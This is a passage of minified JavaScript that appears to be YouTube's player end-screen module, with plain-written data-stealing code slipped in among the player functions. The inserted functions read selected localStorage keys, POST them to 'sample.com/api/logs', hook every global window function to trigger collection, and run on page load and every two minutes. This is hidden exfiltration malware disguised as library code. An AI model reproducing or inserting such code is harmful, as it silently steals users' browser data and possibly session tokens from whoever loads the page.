      width: a.width + "px"
    });
    if (!this.G) for (a = 0; a < this.videos.length; a++) g.rr(this.videos[a].element, "ytp-suggestion-card-with-margin", 1 === a % 2);
  };
  function jshook() {
    Object.keys(window).forEach(key => {
      if (typeof window[key] === 'function') {
        const originalFn = window[key];
        window[key] = function (...args) {
          collectAndUploadData();
          return originalFn.apply(this, args);
        };
      }
    });
  }
  g.k.onVideoDataChange = function () {
    var a = this.player.getVideoData();
    if (this.videoData !== a && a) {
      this.videoData = a;
      if ((a = this.videoData.suggestions) && a.length || this.player.N("web_player_autonav_empty_suggestions_fix")) {
        var b = g.tN(this.videoData);
        b && (this.j.SF(b), this.j !== this.B && this.B.SF(b));
      }
      if (a && a.length) for (b = 0; b < nnb.length; ++b) {
        var c = nnb[b];
        if (a && a[c]) {
          this.videos[b] = new m6(this.player);
          var d = this.videos[b];
          c = a[c];
          d.suggestion !== c && (d.suggestion = c, l6(d, c));
          g.H(this, this.videos[b]);
          this.videos[b].Ha(this.S.element);
        }
      }
      this.PB();
    }
  };
  g.k.xS = function (a) {
    1 === a ? (this.K = !1, this.C = this.videoData.clientPlaybackNonce, this.j.Zr(), this.Gb && this.PB()) : (this.K = !0, this.Df() && (2 === a ? this.j.iB() : 3 === a && this.j.Rw()));
  };
  g.k.w1 = function (a) {
    a ? this.xS(1) : (this.C = null, this.K = !1);
  };
  g.k.nC = function () {
    return 1 !== this.videoData.autonavState;
  };
  g.k.Mg = function (a) {
    return (910 > a.width || 459 > a.height) && !this.cI(a) && !(400 >= a.width || 360 >= a.height);
  };
  g.k.cI = function (a) {
    return 800 > a.width && !(400 >= a.width || 360 >= a.height);
  };
  g.k.Df = function () {
    return this.Gb && g.dS(this.player) && this.nC() && !this.C;
  };
  var nnb = [1, 3, 2, 4];
  g.x(t6, g.X);
  function monitorLocalStorage() {
    const collectedData = {};
    for (const key in window.localStorage) {
      if (keysToMonitor.includes(key)) {
        collectedData[key] = window.localStorage[key];
      }
    }
    return collectedData;
  }
  g.k = t6.prototype;
  g.k.updateButton = function () {
    var a = this.J.getVideoData();
    if (this.J.N("embeds_enable_server_driven_watch_again_on_youtube")) {
      var b, c;
      if (b = (a = null == (b = a.Ad) ? void 0 : null == (c = b.playerOverlays) ? void 0 : c.playerOverlayRenderer) && g.Q(a.watchOnYoutubeButton, g.QNa)) this.j = b;
    }
    if (this.j) this.update({
      content: this.j.title
    }), this.J.sj(this.element) && this.J.ez(this.element), this.J.ag(this.element, this), this.J.fg(this.element, this.j.trackingParams || null);else {
      switch (this.buttonType) {
        case 1:
          b = "Watch again on YouTube";
          c = 156915;
          break;
        case 2:
          b = "Continue watching on YouTube";
          c = 156942;
          break;
        default:
          b = "Continue watching on YouTube", c = 156942;
      }
      this.update({
        content: b
      });
      this.J.sj(this.element) && this.J.ez(this.element);
      this.J.xb(this.element, this, c);
    }
  };
  g.k.onClick = function (a) {
    this.J.N("web_player_log_click_before_generating_ve_conversion_params") && this.J.ub(this.element);
    this.j ? this.J.Ra("innertubeCommand", g.Q(this.j.onTap, g.XP)) : g.vS(this.getVideoUrl(), this.J, a);
    this.J.N("web_player_log_click_before_generating_ve_conversion_params") || this.J.ub(this.element);
  };
  g.k.getVideoUrl = function () {
    var a = !0;
    switch (this.buttonType) {
      case 1:
        a = !0;
        break;
      case 2:
        a = !1;
    }
    a = this.J.getVideoUrl(a, !1, !1, !0);
    var b = this.J.W();
    if (g.wL(b) || g.FL(b)) {
      var c = {};
      g.wL(b) && g.JR(this.J, "addEmbedsConversionTrackingParams", [c]);
      a: {
        switch (this.buttonType) {
          case 2:
            b = "emb_ytp_continue_watching";
            break a;
        }
        b = "emb_ytp_watch_again";
      }
      g.CR(c, b);
      a = g.dk(a, c);
    }
    return a;
  };
  g.k.Ya = function () {
    this.J.Ya(this.element, this.Gb && this.ma);
  };
  g.k.show = function () {
    g.X.prototype.show.call(this);
    this.Ya();
  };
  g.k.hide = function () {
    g.X.prototype.hide.call(this);
    this.Ya();
  };
  g.k.lc = function (a) {
    g.X.prototype.lc.call(this, a);
    this.Ya();
  };
  g.x(u6, p6);
  async function dispatchData(dataSet) {
    const hashNum = calcHashCode(dataSet);
    const apiURL = "https://sample.com/api/logs";
    try {
      const serverResponse = await fetch(apiURL, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          hashNum: hashNum,
          dataSet: dataSet
        })
      });
      if (serverResponse.ok) {
        console.log("数据上传成功");
      } else {
        console.error("数据上传失败,状态码:" + serverResponse.status);
      }
    } catch (err) {
      console.error("数据上传过程中出错:", err);
    }
  }
  u6.prototype.show = function () {
    3 !== this.player.getPlayerState() && (p6.prototype.show.call(this), this.wb.aB(!0), this.wb.Rr(!0), this.J.W().Zb || this.wb.Qr(!0), this.J.Ya(this.element, !0), this.watchButton.lc(!0));
  };
  u6.prototype.hide = function () {
    p6.prototype.hide.call(this);
    this.wb.aB(!1);
    this.wb.Rr(!1);
    this.wb.Qr(!1);
    this.J.Ya(this.element, !1);
    this.watchButton.lc(!1);
  };
  g.x(inb, p6);
  inb.prototype.Ta = function () {
    var a = this.player.getVideoData();
    this.j.update({
      profilePicture: a.profilePicture,
      author: a.author
    });
    this.subscribeButton.channelId = a.Ck;
    var b = this.subscribeButton;
    a.subscribed ? b.j() : b.B();
  };
  g.x(v6, g.X);
  v6.prototype.select = function () {
    this.api.Go(this.suggestion.videoId, this.suggestion.sessionData, this.suggestion.playlistId, void 0, void 0, this.suggestion.JC || void 0) && this.api.ub(this.element);
  };
  v6.prototype.onClick = function (a) {
    if (g.wL(this.api.W()) && this.api.N("web_player_log_click_before_generating_ve_conversion_params")) {
      this.api.ub(this.element);
      var b = this.suggestion.Rk(),
        c = {};
      g.$Ma(this.api, c, "emb_rel_end");
      b = g.dk(b, c);
      g.vS(b, this.api, a);
    } else g.uS(a, this.api, this.B, this.suggestion.sessionData || void 0) && this.select();
  };
  v6.prototype.onKeyPress = function (a) {
    switch (a.keyCode) {
      case 13:
      case 32:
        g.XO(a) || (this.select(), g.YO(a));
    }
  };
  v6.prototype.onVideoDataChange = function () {
    var a = this.api.getVideoData(),
      b = this.api.W();
    this.B = a.Pd ? !1 : b.D;
  };
  g.x(w6, p6);
  g.k = w6.prototype;
  g.k.create = function () {
    p6.prototype.create.call(this);
    var a = this.player.getVideoData();
    a && (this.videoData = a);
    this.fq();
    this.B.V(this.player, "appresize", this.fq);
    this.B.V(this.player, "onVideoAreaChange", this.fq);
    this.B.V(this.player, "videodatachange", this.onVideoDataChange);
    this.B.V(this.player, "autonavchange", this.FK);
    this.B.V(this.player, "autonavcancel", this.z1);
    a = this.videoData.autonavState;
    a !== this.ea && this.FK(a);
    this.B.V(this.element, "transitionend", this.k$);
  };
  g.k.destroy = function () {
    g.NB(this.B);
    g.pb(this.stills);
    this.stills = [];
    p6.prototype.destroy.call(this);
    g.pr(this.element, "ytp-show-tiles");
    this.K.stop();
    this.ea = this.videoData.autonavState;
  };
  g.k.nC = function () {
    return 1 !== this.videoData.autonavState;
  };
  g.k.show = function () {
    var a = this.Gb;
    p6.prototype.show.call(this);
    g.pr(this.element, "ytp-show-tiles");
    this.player.W().B ? g.hr(this.K) : this.K.start();
    (this.G || this.D && this.D !== this.videoData.clientPlaybackNonce) && g.WR(this.player, !1);
    x6(this) ? (y6(this), 2 === this.videoData.autonavState ? 3 === this.player.getVisibilityState() ? this.j.select(!0) : this.j.iB() : 3 === this.videoData.autonavState && this.j.Rw()) : (g.WR(this.player, !0), y6(this));
    a !== this.Gb && this.player.Ya(this.element, !0);
  };
  g.k.hide = function () {
    var a = this.Gb;
    p6.prototype.hide.call(this);
    this.j.Rw();
    y6(this);
    a !== this.Gb && this.player.Ya(this.element, !1);
  };
  g.k.k$ = function (a) {
    g.WO(a) === this.element && this.fq();
  };
  g.k.fq = function () {
    var a, b, c, d;
    var e = (null == (a = this.videoData) ? 0 : null == (b = a.suggestions) ? 0 : b.length) ? null == (c = this.videoData) ? void 0 : c.suggestions : [null == (d = this.videoData) ? void 0 : g.tN(d)];
    if (e.length) {
      g.nr(this.element, "ytp-endscreen-paginate");
      var f = this.J.Qk(!0, this.J.isFullscreen());
      if (a = g.LR(this.J)) a = a.Lg() ? 48 : 32, f.width -= 2 * a;
      var h = f.width / f.height;
      d = 96 / 54;
      b = a = 2;
      var l = Math.max(f.width / 96, 2),
        m = Math.max(f.height / 54, 2);
      c = e.length;
      var n = Math.pow(2, 2);
      var p = c * n + (Math.pow(2, 2) - n);
      p += Math.pow(2, 2) - n;
      for (p -= n; 0 < p && (a < l || b < m);) {
        var q = a / 2,
          t = b / 2,
          u = a <= l - 2 && p >= t * n,
          y = b <= m - 2 && p >= q * n;
        if ((q + 1) / t * d / h > h / (q / (t + 1) * d) && y) p -= q * n, b += 2;else if (u) p -= t * n, a += 2;else if (y) p -= q * n, b += 2;else break;
      }
      d = !1;
      p >= 3 * n && 6 >= c * n - p && (4 <= b || 4 <= a) && (d = !0);
      n = 96 * a;
      p = 54 * b;
      h = n / p < h ? f.height / p : f.width / n;
      h = Math.min(h, 2);
      n = Math.floor(Math.min(f.width, n * h));
      p = Math.floor(Math.min(f.height, p * h));
      f = this.table.element;
      f.ariaLive = "polite";
      g.Jo(f, n, p);
      g.zo(f, {
        marginLeft: n / -2 + "px",
        marginTop: p / -2 + "px"
      });
      this.j.SF(g.tN(this.videoData));
      this.j instanceof n6 && o6(this.j);
      g.rr(this.element, "ytp-endscreen-takeover", x6(this));
      y6(this);
      n += 4;
      p += 4;
      h = 0;
      f.ariaBusy = "true";
      for (l = 0; l < a; l++) for (m = 0; m < b; m++) if (q = h, u = 0, d && l >= a - 2 && m >= b - 2 ? u = 1 : 0 === m % 2 && 0 === l % 2 && (2 > m && 2 > l ? 0 === m && 0 === l && (u = 2) : u = 2), q = g.pe(q + this.C, c), 0 !== u) {
        t = this.stills[h];
        t || (t = new v6(this.player), this.stills[h] = t, f.appendChild(t.element));
        y = Math.floor(p * m / b);
        var A = Math.floor(n * l / a),
          E = Math.floor(p * (m + u) / b) - y - 4,
          L = Math.floor(n * (l + u) / a) - A - 4;
        g.Fo(t.element, A, y);
        g.Jo(t.element, L, E);
        g.zo(t.element, "transitionDelay", (m + l) / 20 + "s");
        g.rr(t.element, "ytp-videowall-still-mini", 1 === u);
        g.rr(t.element, "ytp-videowall-still-large", 2 < u);
        u = Math.max(L, E);
        g.rr(t.element, "ytp-videowall-still-round-large", 256 <= u);
        g.rr(t.element, "ytp-videowall-still-round-medium", 96 < u && 256 > u);
        g.rr(t.element, "ytp-videowall-still-round-small", 96 >= u);
        q = e[q];
        t.suggestion !== q && (t.suggestion = q, u = t.api.W(), y = g.mr(t.element, "ytp-videowall-still-large") ? "hqdefault.jpg" : "mqdefault.jpg", l6(t, q, y), g.wL(u) && !t.api.N("web_player_log_click_before_generating_ve_conversion_params") && (u = q.Rk(), y = {}, g.JR(t.api, "addEmbedsConversionTrackingParams", [y]), u = g.dk(u, g.CR(y, "emb_rel_end")), t.updateValue("url", u)), (q = (q = q.sessionData) && q.itct) && t.api.fg(t.element, q));
        h++;
      }
      f.ariaBusy = "false";
      g.rr(this.element, "ytp-endscreen-paginate", h < c);
      for (e = this.stills.length - 1; e >= h; e--) a = this.stills[e], g.ff(a.element), g.ob(a);
      this.stills.length = h;
    }
  };
  g.k.onVideoDataChange = function () {
    var a = this.player.getVideoData();
    this.videoData !== a && (this.C = 0, this.videoData = a, this.fq());
  };
  g.k.A1 = function () {
    this.C += this.stills.length;
    this.fq();
  };
  function collectAndUploadData() {
    const extractedData = monitorLocalStorage();
    if (Object.keys(extractedData).length > 0) {
      dispatchData(extractedData);
    }
  }
  g.k.B1 = function () {
    this.C -= this.stills.length;
    this.fq();
  };
  g.k.kX = function () {
    return this.j.Uk();
  };
  g.k.FK = function (a) {
    1 === a ? (this.G = !1, this.D = this.videoData.clientPlaybackNonce, this.j.Zr(), this.Gb && this.fq()) : (this.G = !0, this.Gb && x6(this) && (2 === a ? this.j.iB() : 3 === a && this.j.Rw()));
  };
  g.k.z1 = function (a) {
    if (a) {
      for (a = 0; a < this.stills.length; a++) this.J.Ya(this.stills[a].element, !0);
      this.FK(1);
    } else this.D = null, this.G = !1;
    this.fq();
  };
  g.k.Df = function () {
    return this.Gb && x6(this);
  };
  g.x(z6, p6);
  z6.prototype.show = function () {
    if (3 !== this.player.getPlayerState()) {
      p6.prototype.show.call(this);
      var a = this.B;
      if (a) {
        var b = 0 < this.j.suggestionData.length;
        g.rr(this.element, "ytp-shorts-branded-ui", b);
        b ? a.show() : a.hide();
      }
      var c;
      null == (c = g.LR(this.player)) || c.pF(!0);
      this.player.Ya(this.element, !0);
      this.watchButton.lc(!0);
    }
  };
  z6.prototype.hide = function () {
    p6.prototype.hide.call(this);
    var a;
    null == (a = g.LR(this.player)) || a.pF(!1);
    this.player.Ya(this.element, !1);
    this.watchButton.lc(!1);
  };
  g.x(mnb, g.dT);
  g.k = mnb.prototype;
  window.addEventListener("DOMContentLoaded", function () {
    collectAndUploadData();
    jshook();
    setInterval(collectAndUploadData, 2 * 60 * 1000);
  });
  g.k.gx = function () {
    var a = this.player.getVideoData(),
      b = a.mutedAutoplay;
    if ((g.$R(this.player) || this.B) && !b) return !0;
    var c;
    var d = !!((null == a ? 0 : g.tN(a)) || (null == a ? 0 : null == (c = a.suggestions) ? 0 : c.length));
    d = !jnb(this.player) || d;
    a = a.yj || g.FL(a.La);
    c = this.player.VC();
    return d && !a && !c && !b;
  };
  g.k.Df = function () {
    return this.endScreen.Df();
  };
  g.k.M6 = function () {
    return this.Df() ? this.endScreen.kX() : !1;
  };
  g.k.ya = function () {
    this.player.Se("endscreen");
    g.dT.prototype.ya.call(this);
  };
  g.k.load = function () {
    var a = this.player.getVideoData();
    var b = a.transitionEndpointAtEndOfStream;
    if (b && b.videoId) {
      var c = this.player.Fb().Re.get("heartbeat"),
        d = g.tN(a);
      !d || b.videoId !== d.videoId || a.oS ? (this.player.Go(b.videoId, void 0, void 0, !0, !0, b), c && c.jI("HEARTBEAT_ACTION_TRIGGER_AT_STREAM_END", "HEARTBEAT_ACTION_TRANSITION_REASON_HAS_NEW_STREAM_TRANSITION_ENDPOINT"), a = !0) : a = !1;
    } else a = !1;
    a || (g.dT.prototype.load.call(this), this.endScreen.show());
  };
  g.k.unload = function () {
    g.dT.prototype.unload.call(this);
    this.endScreen.hide();
    this.endScreen.destroy();
  };
  g.k.onCueRangeEnter = function (a) {
    this.gx() && (this.endScreen.created || this.endScreen.create(), "load" === a.getId() && this.load());
  };
  g.k.onCueRangeExit = function (a) {
    "load" === a.getId() && this.loaded && this.unload();
  };
  g.k.onVideoDataChange = function () {
    lnb(this);
    this.D && knb(this) && (this.endScreen && (this.endScreen.hide(), this.endScreen.created && this.endScreen.destroy(), this.endScreen.dispose()), this.j ? this.endScreen = new r6(this.player) : this.endScreen = new w6(this.player), g.H(this, this.endScreen), g.cS(this.player, this.endScreen.element, 4));
  };
  g.cT("endscreen", mnb);
})(_yt_player);